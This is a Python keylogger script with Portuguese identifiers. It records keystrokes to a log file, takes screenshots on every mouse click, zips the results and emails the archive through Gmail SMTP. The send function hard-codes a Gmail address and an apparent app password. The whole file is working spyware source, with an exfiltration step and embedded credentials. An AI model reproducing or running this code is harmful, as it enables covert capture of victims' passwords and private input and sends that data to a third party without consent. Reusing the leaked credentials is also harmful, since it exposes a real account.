from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
from smtplib import SMTP
from zipfile import ZipFile
import pyautogui as py
import os
import re
from datetime import datetime
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import keyboard
import sys
import importlib
importlib.reload(sys)

dataAtual = datetime.now()
data = dataAtual.strftime("%d-%m")
diretorioRaiz = "./registros/keylogger_" + data + "/"
arquivoLog = diretorioRaiz + "keylogger.log"

try:
    os.mkdir(diretorioRaiz)
except:
    pass


def on_press(tecla):
    # tecla = tecla.encode('utf-8')
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.tab', '\t', tecla)
    tecla = re.sub(r'Key.backspace', 'apagar', tecla)
    tecla = re.sub(r'Key.*', '', tecla)

    with open(arquivoLog, 'a', encoding='utf-8') as log:
        if str(tecla) == str("apagar"):
            if os.stat(arquivoLog).st_size != 0:
                tecla = re.sub(r'Key.backspace', '', tecla)
                log.seek(0, 2)
                caractere = log.tell()
                log.truncate(caractere - 1)
        else:
            log.write(tecla)
            # log.write(tecla.encode('utf-8').decode('utf-8'))


def on_click(x, y, buttom, pressed):
    if pressed:
        minhaPrint = py.screenshot()
        hora = datetime.now()
        horarioPrint = hora.strftime("%H:%M:%S")

        minhaPrint.save(os.path.join(
            diretorioRaiz, "printKeylogger_" + horarioPrint.replace(':', '') + ".jpg"))


def parar_execucao():
    keyboardListener.stop()
    mouseListener.stop()
    sys.exit()


# Compactar a pasta em um arquivo zip
with ZipFile('./registros.zip', 'w') as zip:
    for file in os.listdir(diretorioRaiz):
        zip.write(os.path.join(diretorioRaiz, file))


def enviar_email_com_anexo(de, para, assunto, corpo, arquivo):
    msg = MIMEMultipart()
    msg['From'] = de
    msg['To'] = para
    msg['Subject'] = assunto

    msg.attach(MIMEText(corpo))
    arquivo = "C:\\Users\\alisson\\Documents\\ORGANIZAR\\ocr\\registros.zip"
    # arquivo = "./"
    part = MIMEBase('application', "octet-stream")
    part.set_payload(open(arquivo, "rb").read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment', filename=arquivo)
    msg.attach(part)

    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.ehlo()
    smtp.starttls()
    smtp.login(de, 'xssimsxjiqehyyfc')
    smtp.sendmail(de, para, msg.as_string())
    smtp.quit()


enviar_email_com_anexo(
    'alissonbc2497@gmail.com',
    'alissonbc2497@gmail.com',
    'Captura de tela + Captura de teclas',
    'Anexo: registros.zip',
    'registros.zip'
)

keyboard.add_hotkey('esc', parar_execucao)

keyboardListener = KeyboardListener(on_press=on_press)
mouseListener = MouseListener(on_click=on_click)

keyboardListener.start()
mouseListener.start()
keyboardListener.join()
mouseListener.join()
